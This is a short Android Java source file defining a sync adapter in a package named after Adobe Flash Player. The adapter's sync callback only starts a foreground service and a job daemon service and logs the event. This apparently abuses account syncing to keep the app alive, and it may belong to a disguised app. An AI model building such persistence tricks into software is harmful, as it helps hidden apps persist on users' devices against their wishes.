package com.adobe.flashplayer.account;


import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SyncResult;
import android.os.Bundle;
import android.util.Log;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.core.CoreHelper;


public class SyncAdapter extends AbstractThreadedSyncAdapter {
    private final String TAG = "[ljg]SyncAdapter";

    public SyncAdapter(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
        Log.e(TAG, "SyncAdapter");

    }

    //参数ContentProviderClient provider就是配置的Contentprivder==AccountStubProvider
    @Override
    public void onPerformSync(Account account, Bundle extras, String authority, ContentProviderClient provider, SyncResult syncResult) {
        try{
            Context context = getContext();

            CoreHelper.startForegroundService(context);

            CoreHelper.startJobDeamonService(context);

            Log.e(TAG, "onPerformSync");
            MyLog.writeLogFile(Utils.formatCurrentDate() + " onPerformSync\r\n");
        }
        catch(Exception ex){
            ex.printStackTrace();
        }
    }

}